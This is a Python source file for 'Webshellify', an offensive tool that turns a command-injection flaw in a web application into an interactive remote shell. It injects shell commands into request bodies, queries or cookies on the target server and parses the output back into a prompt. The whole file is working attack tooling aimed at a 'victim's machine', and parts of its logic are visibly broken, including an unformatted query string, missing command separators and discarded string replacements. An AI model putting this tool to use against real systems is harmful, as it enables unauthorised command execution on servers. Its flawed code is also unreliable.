"""
Webshellify is a python3 class that attempts to improve the reverse shell
experience.

The necessary request information should be specified or any functions that
fetch necessary values from the server may be passed in as well.

The location to specify where the command would be is specified by adding the
string "CMDFUZZ" in either the request body or request query. This fuzzing string
can be altered if necessary.
"""
import re
import requests as req
import urllib.parse

class Webshellify:
    content_types = [
        "text/plain",
        "application/x-www-form-urlencoded"
    ]
    """
    Usage:
    If the vulnerable webpage is at http://localhost/vuln/path, then the correct
    initialization for a Webshellify instance would be:
    `wshell = Webshellify("localhost", "/vuln/path", [options])`

    options then include:
    - debug: (boolean) Enable debugging messages, false by default
    """
    def __init__(self, host, path, debug=False, **args):
        # store necessary information that will improve the webshell
        self.workdir = "/"
        self.parentdir = "/"

        self.host = ""
        self.user = ""

        self.delimiter = "output"

        self.host = host
        if("://" in self.host): # remove "http://" portion
            self.host = host.split("://")[-1]

        self.path = path
        if(self.path[0] == '/'):
            self.path = path [1:]

        self.debug = debug

        # necessary request information
        self.headers = {
            "User-Agent" : "curl/7.82.0",
            "Accept" : "*/*",
            "Host" : self.host,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        self.cookies = {}
        self.method = "POST"

        self.body = ""
        self.queries = {}
        self.cmd_fuzz = "CMDFUZZ"

    """
    Generates the given command into a form that can be easily extracted from
    the response.

    This command may contain additional command calls to determine additional
    information of the current user and machine name
    """
    def __gen_command(self, command, chdir=False):
        commands = ""
        if(chdir):
            commands += f"cd {self.workdir};"

        commands += f"echo '`{self.delimiter}-user`'; whoami; echo '`/{self.delimiter}-user`';"
        commands += f"echo '`{self.delimiter}-host`'; uname -n; echo '`/{self.delimiter}-host`'"
        commands += f"echo '`{self.delimiter}`'; {command}; echo '`/{self.delimiter}`'"
        commands += f"echo '`{self.delimiter}-wd`'; pwd; echo '`/{self.delimiter}-wd`'"
        return commands

    """
    Extracts the output from the command call from the page results

    this will return the current user, working directory and command
    response.

    usage: user, wd, output = self.__extract_output(raw)
    """
    def __extract_output(self, raw):
        # if(self.debug):
        #     print(f"[debug] in funct `__extract_output`:\nraw: {raw}")

        if(f"`{self.delimiter}`" not in raw):
            raise Exception("[warn] response data not found")

        wd_regex = f"`{self.delimiter}-wd`\n((.*\n)*)`\/{self.delimiter}-wd`"
        output_regex = f"`{self.delimiter}`\n((.*\n)*)`\/{self.delimiter}`"
        wd_re = re.compile(wd_regex)
        output_re = re.compile(output_regex)
        if(self.debug):
            print(f"""[debug] in funct `__extract_output`
wd regex: {wd_regex}
match: {wd_re.findall(raw)}
output regex: {output_regex}
match: {output_re.findall(raw)}""")
        workdir = wd_re.findall(raw)[0][0][:-1]
        output = output_re.findall(raw)[0][0][:-1]
        return workdir, output

    """
    Sends an individual command in isolation to the host and path initialized.

    This requires a preset location for the command to be inserted into the
    request. This requires the command fuzz keyword to be placed in either a
    query paramter or the request body

    parameters
    ----------
    command: (string) - The command to execute at the victim's machine
    chdir: (boolean, optional) - Indicates whether the directory should be changed.

    This function will also return the name of the host, name of the current
    user and the output of the previous command
    """
    def send_command(self, command, chdir=False):
        cmd = self.__gen_command(command, chdir=chdir)
        # generate query
        query_str = "?"
        for key, value in enumerate(self.queries):
            if(self.cmd_fuzz in value):
                value = value.replace(self.cmd_fuzz, cmd)
            query_str += "{key}={value}&"
        query_str = query_str[:-1] # remove the last character (either '?' or '&')

        # generate cookies
        cookie_dict = {}
        for key, value in self.cookies.items():
            if(self.cmd_fuzz in value):
                value = value.replace(self.cmd_fuzz, cmd)
            cookie_dict[key] = value

        # generate body (if it is neither a GET nor a HEAD request)
        body_str = ""
        if(self.method.upper() != "GET" and self.method.upper() != "HEAD"):
            body_str = self.body
            if(self.cmd_fuzz in body_str):
                body_str = body_str.replace(self.cmd_fuzz, cmd)

        # generate url
        url = f"http://{self.host}/{self.path}{query_str}"

        # send request with payload
        if(self.debug):
            print(f"""
[debug] in funct `send_command`
sent
----
method: {self.method.upper()}
url: {url}
cookies: {cookie_dict}
data: {body_str}
headers: {self.headers}
"""
            )

        resp = req.request(
                self.method.upper(),
                url,
                cookies=cookie_dict,
                data=body_str,
                headers=self.headers)

        return self.__extract_output(resp.text)

    def __get_parent_dir(self, workdir):
        # currently assuming a Linux machine, so paths are delimited by '/'
        path_parts = workdir.split('/')
        return '/'.join(path_parts[0:-1])

    def __get_init_info(self):
        try:
            workdir, whoami = self.send_command("whoami")
            self.workdir = workdir
            self.parentdir = self.__get_parent_dir(workdir)
            self.user = whoami
        except Exception as e:
            print(e)
            print("[info] may be a blind command execution?")
            print("[info] if so, please set optional argument \"blind\" to True")
            exit(1)
            self.workdir = "/?/?"
            self.parentdir = self.__get_parent_dir(self.workdir)
            self.user = "?"

    def create_shell(self):
        self.__get_init_info()
        # capture KeyboardInterrupts
        exit_confirm = False
        while(True):
            try:
                current_dir = self.workdir
                shell_prompt = f"{self.user}@{self.host} : {current_dir} > "
                command = input(shell_prompt)

                if(" .." in command):
                    command.replace(" ..", f" {self.parentdir}")

                if(" ." in command):
                    command.replace(" .", f" {self.workdir}")

                if(self.debug):
                    print(f"[debug] in funct `create_shell`\nworking directory : {self.workdir}\nparent directory : {self.parentdir}")

                workdir, output = self.send_command(command, chdir=True)
                self.workdir = workdir
                self.parentdir = self.__get_parent_dir(workdir)
                print(output)

                exit_confirm = False
            except EOFError:
                if(not exit_confirm):
                    print("[note] ^D pressed, this will close the current shell.")
                    print("[note] please press ^D or ^C again to close the program")
                    exit_confirm = True
                    continue
                print("[note] exiting...")
                return
            except KeyboardInterrupt:
                if(not exit_confirm):
                    print("[note] ^D pressed, this will close the current shell.")
                    print("[note] please press ^D or ^C again to close the program")
                    exit_confirm = True
                    continue
                print("[note] exiting...")
                return
            except Exception as e:
                print(e)

    def set_body(self, body):
        self.body = body

    def set_query_param(self, key, value):
        self.queries[key] = value

    def set_header(self, key, value):
        self.headers[key] = value

    def set_cookie(self, key, value):
        self.cookies[key] = value

    def set_method(self, method):
        self.method = method
